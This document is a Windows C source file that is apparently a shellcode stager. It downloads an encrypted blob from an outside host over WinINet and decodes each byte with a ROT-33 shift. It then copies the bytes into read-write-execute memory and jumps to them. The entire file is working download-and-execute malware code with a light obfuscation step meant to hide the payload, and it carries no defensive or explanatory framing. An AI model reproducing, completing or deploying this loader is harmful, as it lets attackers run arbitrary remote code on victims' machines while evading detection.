#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

void rot_n(unsigned char *byte, int n);

int main() {
    const char *url = "http://bigbadcyborg.com/encrypted.bin";
    int rotation_value = 33;  // Example ROT value for decryption
    HINTERNET hInternet = NULL, hConnect = NULL;
    unsigned char *shellcode = NULL;
    void *exec = NULL;

    // Initialize WinINet
    hInternet = InternetOpen("WinINet", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        fprintf(stderr, "Error: InternetOpen failed (%ld)\n", GetLastError());
        goto cleanup;
    }

    // Open the URL
    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        fprintf(stderr, "Error: InternetOpenUrl failed (%ld)\n", GetLastError());
        goto cleanup;
    }

    // Allocate a buffer to read the data
    DWORD file_size = 0;
    DWORD bytes_read = 0;
    shellcode = (unsigned char *)malloc(4096);  // Initial allocation
    if (shellcode == NULL) {
        fprintf(stderr, "Error: Failed to allocate memory for shellcode!\n");
        goto cleanup;
    }

    unsigned char *current_position = shellcode;
    DWORD total_size = 0;

    // Read the data from the URL
    while (InternetReadFile(hConnect, current_position, 4096, &bytes_read) && bytes_read > 0) {
        total_size += bytes_read;
        current_position += bytes_read;
        // Resize the buffer if necessary
        unsigned char *temp = (unsigned char *)realloc(shellcode, total_size + 4096);
        if (temp == NULL) {
            fprintf(stderr, "Error: Failed to reallocate memory for shellcode!\n");
            goto cleanup;
        }
        shellcode = temp;
    }

    if (total_size == 0) {
        fprintf(stderr, "Error: No data received from URL!\n");
        goto cleanup;
    }

    // Allocate memory for the final executable shellcode
    exec = VirtualAlloc(NULL, total_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        fprintf(stderr, "Error: VirtualAlloc failed!\n");
        goto cleanup;
    }

    // Decrypt each byte and print it for debugging
    printf("Decrypted shellcode bytes:\n");
    for (DWORD i = 0; i < total_size; i++) {
        rot_n(&shellcode[i], -rotation_value);  // Decrypt the byte
        printf("%02x ", shellcode[i]);  // Print the decrypted byte in hexadecimal format
        if ((i + 1) % 16 == 0) printf("\n");  // Format output in rows of 16 bytes
    }
    printf("\n");

    // Copy the decrypted shellcode into executable memory
    memcpy(exec, shellcode, total_size);

    printf("Shellcode is now in executable memory. Press Enter to execute...\n");
    getchar();

    // Execute the shellcode
    ((void(*)())exec)();

cleanup:
    // Clean up allocated resources
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    if (shellcode) free(shellcode);
    if (exec) VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}

// ROTN function to encrypt or decrypt a byte
void rot_n(unsigned char *byte, int n) {
    *byte = (*byte + n + 256) % 256;  // Add 256 to ensure non-negative results for decryption
}
